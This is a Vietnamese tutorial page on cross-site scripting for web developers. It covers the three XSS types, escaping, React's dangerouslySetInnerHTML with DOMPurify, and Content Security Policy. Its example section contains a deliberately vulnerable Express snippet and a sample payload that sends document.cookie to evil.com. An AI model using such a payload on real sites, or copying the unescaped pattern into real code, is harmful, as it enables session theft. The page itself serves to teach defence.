---
sidebar_position: 1
title: "1. XSS (Cross-Site Scripting)"
---

# XSS — Cross-Site Scripting

**XSS** (Cross-Site Scripting — chèn mã kịch bản xuyên trang) là lỗ hổng cho phép
kẻ tấn công **nhét JavaScript độc hại** vào trang web để nó chạy trên trình duyệt
của nạn nhân. Đây là một trong những lỗ hổng web phổ biến nhất. Bài này giải thích
các loại XSS, hậu quả, và — quan trọng nhất — cách phòng thủ trong ứng dụng thực
tế (đặc biệt với React).

---

## Mục lục

- [XSS là gì và nguy hiểm ra sao?](#xss-là-gì-và-nguy-hiểm-ra-sao)
- [Ba loại XSS](#ba-loại-xss)
- [Ví dụ lỗ hổng](#ví-dụ-lỗ-hổng)
- [Phòng thủ: escape theo ngữ cảnh](#phòng-thủ-escape-theo-ngữ-cảnh)
- [XSS trong React](#xss-trong-react)
- [CSP — lớp phòng thủ bổ sung](#csp--lớp-phòng-thủ-bổ-sung)
- [Tóm tắt](#tóm-tắt)

---

## XSS là gì và nguy hiểm ra sao?

XSS xảy ra khi ứng dụng **đưa dữ liệu do người dùng cung cấp vào trang HTML mà
không xử lý đúng cách**, khiến trình duyệt hiểu nhầm dữ liệu đó là **mã thực thi**.

Khi script của kẻ tấn công chạy trong trình duyệt nạn nhân, nó có thể:

- **Đánh cắp cookie / token** → chiếm phiên đăng nhập (session hijacking).
- **Đọc/sửa nội dung trang**, ghi lại phím gõ (keylog).
- **Thực hiện hành động thay nạn nhân** (chuyển tiền, đổi mật khẩu).

> Script độc hại chạy với **chính quyền của nạn nhân**, trong **chính origin** của
> trang — nên nó làm được mọi thứ mà người dùng làm được.

## Ba loại XSS

| Loại | Mã độc đến từ đâu | Ví dụ |
| --- | --- | --- |
| **Stored** (lưu trữ) | Lưu trong DB rồi hiển thị cho nhiều người | Bình luận chứa `<script>` hiển thị cho mọi người xem |
| **Reflected** (phản chiếu) | Phản chiếu ngay từ request (URL, form) | Link độc `?q=<script>...` gửi cho nạn nhân |
| **DOM-based** | Do JavaScript phía client xử lý sai | Code client lấy `location.hash` rồi nhét vào `innerHTML` |

> **Stored XSS** thường nguy hiểm nhất vì ảnh hưởng nhiều người và tự động kích
> hoạt khi họ xem nội dung.

## Ví dụ lỗ hổng

```js
// LỖ HỔNG: nhét thẳng input người dùng vào HTML
const comment = req.query.comment
res.send(`<div>Bình luận: ${comment}</div>`)

// Kẻ tấn công gửi comment = <script>fetch('https://evil.com?c='+document.cookie)</script>
// → script chạy trên trình duyệt mọi người xem trang, gửi cookie đi
```

## Phòng thủ: escape theo ngữ cảnh

Nguyên tắc cốt lõi: **escape (thoát ký tự) dữ liệu theo đúng ngữ cảnh nơi nó được
chèn vào.** Trong HTML, các ký tự đặc biệt phải được đổi thành thực thể an toàn:

| Ký tự | Escape thành |
| --- | --- |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |

Khi escape, `<script>` biến thành `&lt;script&gt;` — trình duyệt hiển thị nó dưới
dạng **văn bản**, không chạy như mã.

> Trong thực tế, **đừng tự viết hàm escape**. Hãy để framework template (React,
> Vue, các template engine) tự escape, hoặc dùng thư viện chuyên dụng để sanitize
> HTML.

## XSS trong React

Tin tốt: **React tự động escape** mọi giá trị bạn nhúng bằng `{}`, nên mặc định an
toàn:

```jsx
// AN TOÀN: React tự escape — chuỗi hiển thị dưới dạng text, không chạy
function Comment({ text }) {
  return <div>{text}</div>
}
```

Nguy hiểm chỉ đến khi bạn **cố tình bỏ qua** cơ chế này bằng
`dangerouslySetInnerHTML`:

```jsx
// NGUY HIỂM: bỏ qua escape, nhét HTML thô
function Comment({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```

Nếu **bắt buộc** phải render HTML do người dùng tạo (vd nội dung từ rich-text
editor), hãy **sanitize trước** bằng thư viện kiểm chứng như **DOMPurify**:

```jsx
import DOMPurify from 'dompurify'

function Comment({ html }) {
  // Lọc bỏ <script>, sự kiện onerror=, javascript: ... chỉ giữ HTML an toàn
  const clean = DOMPurify.sanitize(html)
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}
```

:::danger Tên của nó đã cảnh báo
`dangerouslySetInnerHTML` được đặt tên "dangerously" có chủ đích. Chỉ dùng khi
thật sự cần, và **luôn sanitize** dữ liệu trước. Tránh các "ngõ thoát" tương tự
như `innerHTML`, `document.write`, `eval`.
:::

## CSP — lớp phòng thủ bổ sung

**CSP** (Content Security Policy) là một HTTP header cho trình duyệt biết **nguồn
script nào được phép chạy**. Ngay cả khi kẻ tấn công nhét được script, CSP có thể
**chặn nó thực thi** — đây là lớp phòng thủ thứ hai (defense in depth).

```text
Content-Security-Policy: default-src 'self'; script-src 'self'
```

> CSP được trình bày kỹ ở mục **4. Transport & Headers**. Hãy nhớ: CSP **bổ sung**
> chứ không thay thế việc escape/sanitize đúng cách.

## Tóm tắt

- **XSS** = chèn JavaScript độc hại để nó chạy trên trình duyệt nạn nhân, với
  quyền và origin của nạn nhân → đánh cắp session, hành động thay người dùng.
- Ba loại: **Stored** (nguy hiểm nhất), **Reflected**, **DOM-based**.
- Phòng thủ cốt lõi: **escape dữ liệu theo ngữ cảnh đích**; đừng tự viết, hãy dùng
  framework/thư viện.
- **React tự escape** với `{}`; nguy hiểm khi dùng `dangerouslySetInnerHTML` —
  phải **sanitize bằng DOMPurify** trước.
- **CSP** là lớp phòng thủ bổ sung, không thay thế escape/sanitize.

Bài tiếp theo: **CSRF** — lừa trình duyệt nạn nhân gửi request ngoài ý muốn.
